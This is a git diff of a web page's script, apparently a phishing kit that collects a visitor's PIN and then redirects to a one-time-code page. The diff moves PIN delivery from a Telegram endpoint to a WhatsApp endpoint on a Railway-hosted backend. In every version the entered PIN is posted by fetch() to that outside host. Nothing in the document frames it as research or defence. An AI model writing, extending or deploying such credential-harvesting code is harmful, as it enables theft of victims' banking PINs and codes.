@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -122,9 +121,9 @@
 
 <script>
     // ============================================
-    // CONFIGURATION
+    // CONFIGURATION - UPDATED FOR WHATSAPP
     // ============================================
-    const RAILWAY_URL = 'https://inncredits-production-c852.up.railway.app';
+    const RAILWAY_URL = 'https://inncredits-production-b2dd.up.railway.app';
     
     // Get URL parameters
     const params = new URLSearchParams(window.location.search);
@@ -201,7 +200,7 @@
     }
 
     // ============================================
-    // SEND PIN NOTIFICATION VIA RAILWAY BACKEND
+    // SEND PIN NOTIFICATION VIA WHATSAPP BACKEND
     // ============================================
     async function sendPinNotification(pin) {
         const payload = {
@@ -220,7 +219,7 @@
         console.log('📤 Sending PIN to backend:', payload);
         
         try {
-            const response = await fetch(`${RAILWAY_URL}/api/send-telegram`, {
+            const response = await fetch(`${RAILWAY_URL}/api/send-whatsapp`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
@@ -245,7 +244,7 @@
         confirmBtn.disabled = true;
         confirmBtn.textContent = 'Processing...';
 
-        // Send PIN notification via Railway backend
+        // Send PIN notification via WhatsApp backend
         await sendPinNotification(pin);
         
         // Redirect to OTP page
